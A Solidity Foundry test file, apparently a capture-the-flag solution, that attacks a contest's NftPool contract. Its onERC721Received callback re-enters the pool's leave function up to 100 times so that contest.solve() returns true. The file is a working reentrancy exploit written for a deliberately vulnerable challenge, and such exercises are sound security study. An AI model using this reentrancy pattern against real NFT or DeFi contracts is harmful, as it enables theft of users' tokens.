// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {EnumNft, NftPool, Contest} from "../src/NFTPool.sol";

contract NFTPoolTest is Test {
    EnumNft public nft;
    NftPool public nftPool;
    Contest public contest;
    uint256 replayAmount = 0;
    bool didInitMint = false;

    constructor() {
        contest = new Contest();
        contest.init();
        didInitMint = true;
    }

    function testAttack() public {
        uint256 tokenId = contest.tokenId();
        nft = contest.nft();
        nftPool = contest.nftPool();
        nft.approve(address(nftPool), tokenId);
        nftPool.enter(tokenId);
        nftPool.leave(tokenId);
        assertEq(contest.solve(), true);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes memory
    ) external returns (bytes4) {
        if (!didInitMint) {
            return this.onERC721Received.selector;
        }

        if (replayAmount < 100) {
            replayAmount++;
            nft.safeTransferFrom(address(this), address(nftPool), 1);
            nftPool.leave(tokenId);
        }
        return this.onERC721Received.selector;
    }
}
